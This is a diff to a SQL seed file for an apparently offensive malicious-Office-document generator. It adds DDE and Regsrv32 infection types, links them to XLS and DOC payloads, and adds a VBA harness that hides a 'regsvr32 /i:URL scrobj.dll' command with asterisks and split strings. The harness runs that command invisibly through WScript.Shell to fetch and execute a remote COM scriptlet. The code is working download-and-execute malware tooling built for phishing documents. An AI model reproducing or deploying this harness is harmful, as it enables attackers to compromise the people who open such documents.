@@ -161,6 +161,8 @@ INSERT INTO InfectionTypes (Name, Description) VALUES ('ReflectivePE', 'Saves b6
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Metadata', 'Saves your shell command to the `Subject` field of the metadata. Good for empire stagers!');  --8
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed-Obfuscated', 'Obfuscates PowerShell based payload using Invoke-Obfuscation');  --9
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Pubprn.vbs', 'Fires your hosted COM scriptlet through pubprn.vbs (Microsoft signed)');  --10
+INSERT INTO InfectionTypes (Name, Description) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/'); --11
+INSERT INTO InfectionTypes (Name, Description) VALUES ('Regsrv32', 'Fires your hosted COM scriptlet through regsrv32 (Microsoft signed)');  --12
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/');                                                                           --7
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Encrypted', 'Embeds encrypted payload into cells. When user Enablez Content, key is retrieved and the payload is decrypted, saved to disk, then fired.');                                                   --8
 
@@ -173,8 +175,10 @@ INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 5); 
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 6);     -- Exe & SaveToDisk
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 7);     -- Exe & ReflectivePE
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 8);     -- ShellCommand & Metadata
+INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 11);     -- ShellCommand & DDE
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 9);     -- PowerShell & CellEmbed-Obfuscated
-INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 10);     -- Shell Command & pubprn.vbs
+INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 10);     -- COM Scriptlet & pubprn.vbs
+INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 12);     -- COM scriptlet & Regsrv32
 --INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 9);     -- ShellCommand & DDE
 
 
@@ -189,9 +193,12 @@ INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 7); -- X
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 8); -- XLS & Metadata
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 9); -- XLS & CellEmbed-Obfuscation
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 10); -- XLS & pubprn.vbs
+INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 11); -- XLS & DDE
+INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 12); -- XLS & Regsrv32
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 1); -- DOC & Shell Command
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 8); -- DOC & MetaData
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 10); -- DOC & pubprn.vbs
+INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 12); -- DOC & Regsrv32
 
 
 -- 1
@@ -540,6 +547,17 @@ Function |RANDOMNAME|()
 End Function
 
 ');
+
+--20
+INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('REGSRV32', 'harness', '
+Function |RANDOMNAME|()
+    Dim q As String
+    q= "r*eg*sv*r3*2 /s /n /u /i:|URL| sc*r*o*b*j.dl*l"
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+    s.Run Replace(q, "*", ""), 0
+End Function
+
+'); 
 
 
 
